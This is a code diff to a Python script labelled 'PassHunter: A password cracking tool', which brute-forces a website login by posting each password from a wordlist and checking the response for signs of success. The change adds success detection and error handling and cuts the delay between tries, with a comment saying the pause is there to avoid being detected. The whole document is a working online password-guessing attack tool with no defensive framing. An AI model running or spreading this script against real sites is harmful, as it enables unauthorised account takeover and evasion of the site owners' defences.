@@ -4,8 +4,16 @@ import time
 
 def attempt_login(url, username, password):
     data = {'username': username, 'password': password}
-    response = requests.post(url, data=data)
-    return response.status_code
+    try:
+        response = requests.post(url, data=data)
+        if response.status_code == 200:
+            # Customize this based on the website's specific successful login response.
+            if "Welcome" in response.text or "dashboard" in response.url:
+                return True
+        return False
+    except requests.RequestException as e:
+        print(f"Error: {e}")
+        return None
 
 def main():
     parser = argparse.ArgumentParser(description='PassHunter: A password cracking tool.')
@@ -15,17 +23,28 @@ def main():
 
     args = parser.parse_args()
 
-    with open(args.password_list, 'r') as f:
-        passwords = f.read().splitlines()
+    try:
+        with open(args.password_list, 'r', encoding="ISO-8859-1") as f:
+            passwords = f.read().splitlines()
+    except IOError as e:
+        print(f"Failed to open password list file: {e}")
+        return
 
     for password in passwords:
         print(f'Trying password: {password}')
-        status_code = attempt_login(args.url, args.username, password)
-        
-        if status_code == 200:  # Adjust according to the expected success code
-            print(f'Password found: {password}')
+        success = attempt_login(args.url, args.username, password)
+
+        if success:
+            print(f"[+] Password found: {password}")
             break
-        time.sleep(1)  # Optional: to avoid rapid requests
+        elif success is None:
+            print("[-] Skipping due to a request error.")
+        else:
+            print("[-] Incorrect password.")
+
+        # Wait a bit between attempts to avoid being detected
+        time.sleep(0.5)
 
 if __name__ == '__main__':
     main()
+
